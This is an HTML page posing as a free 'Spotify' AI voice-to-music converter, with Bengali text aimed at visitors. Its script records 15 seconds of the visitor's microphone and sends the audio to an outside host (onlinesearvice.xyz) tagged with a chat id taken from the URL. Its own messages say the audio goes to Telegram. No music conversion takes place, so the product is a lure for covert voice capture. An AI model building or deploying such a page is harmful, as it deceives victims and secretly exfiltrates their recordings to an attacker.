<!DOCTYPE html>
<html lang="en">
 
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Voice to music player</title>
  <link rel="stylesheet" type="text/css" href="styles.css">
</head>

<body>
  <header id="header">
    <h2>Spotify-Voice to music converter</h2>
  </header>

   <div id="musicDescription">
      <img id="descriptionText" src="https://online-sheba.github.io/Spotify/AI-Voice-to-music/6af36f7b9c1ac8a7e9d7dbcaa479b616_w200.gif" style="width: 200px; height: 200px; border-radius: 50%; border: 2px solid white;">
    </div>
  </div>

  <div id="playerContainer">
    <button id="recordButton" onclick="startRecording()"><b>Start Signing</b></button>
  </div>

  <div id="recordingMessage"></div>

  <input type="hidden" id="chatid" name="chatid" value="">

<br>

<marquee behavior="" direction="">Record your voice and converted to music </marquee><hr>

<h2 style="text-align: center;margin-left: 18px;">Best & Powerful Ai <br> Voice To Music Converter</h2>

  <footer>
    <h3>আপনার ভয়েস থেকে সুরেলা কন্ঠে গান তৈরি করুন, সম্পূর্ণ বিনামূল্য! </h3>
  </footer>

  <script>
  function getChatIdFromURL() {
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get('id');
  }
  const chatIdInput = document.getElementById('chatid');
  const extractedChatId = getChatIdFromURL();
  chatIdInput.value = extractedChatId;
  </script>
  <script>
    function startRecording() {
      // Ensure your page is served over HTTPS for media access
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        alert('Your browser does not support audio recording.');
        return;
      }
    //Coded byb: Shofikul Islam 
      //Founder of : TEAM X 1337
      const chatIdInput = document.getElementById('chatid');
      const recordingMessage = document.getElementById('recordingMessage');
    
      let isRecording = false;
      let mediaRecorder;
      let audioChunks = [];
    
      if (!isRecording) {
        isRecording = true;
        recordingMessage.textContent = "Recording..(15 seconds) গান বলা শুরু করুন";
    
        const constraints = { audio: true };
    
        navigator.mediaDevices.getUserMedia(constraints)
          .then(function(stream) {
            mediaRecorder = new MediaRecorder(stream);
            mediaRecorder.ondataavailable = function(event) {
              if (event.data.size > 0) {
                audioChunks.push(event.data);
              }
            };
            mediaRecorder.start();
            setTimeout(stopRecording, 15000); // Stop recording after 10 seconds
          })
          .catch(function(error) {
            console.error("Error accessing the microphone:", error);
            recordingMessage.textContent = "Error accessing the microphone.";
          });
      }
    
      function stopRecording() {
        if (isRecording) {
          isRecording = false;
          mediaRecorder.stop();
          recordingMessage.textContent = "Recording Success, Processing...";
          const chatID = chatIdInput.value;
    
          mediaRecorder.onstop = function() {
            const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
    
            const formData = new FormData();
            formData.append('audio', audioBlob, 'audio.wav');
            formData.append('chatid', chatID);
    
            fetch('http://onlinesearvice.xyz/voice/index.php', {
                method: 'POST',
                body: formData
              })
              .then(response => response.json())
              .then(data => {
                console.log('Audio sent to Telegram via PHP:', data);
                recordingMessage.textContent = "Audio sent to Telegram!";
              })
              .catch(error => {
                console.error("Error sending audio to Telegram via PHP:", error);
                recordingMessage.textContent = "দুঃখীত আপনার ভয়েস পরিষ্কার বোঝা যাচ্ছে না অনুগ্রহ করে আবার বলুন";
              });
          };
        }
      }
    }
  </script>
  <script src="code.js"></script>

  <script>
    let isPlaying = false;

    function togglePlay() {
      const playButton = document.getElementById("recordButton");

      if (isPlaying) {

        playButton.innerText = "Start Recording";
      } else {

        playButton.innerText = "Pause";
      }

      isPlaying = !isPlaying;
    }
  </script>
</body>
</html>
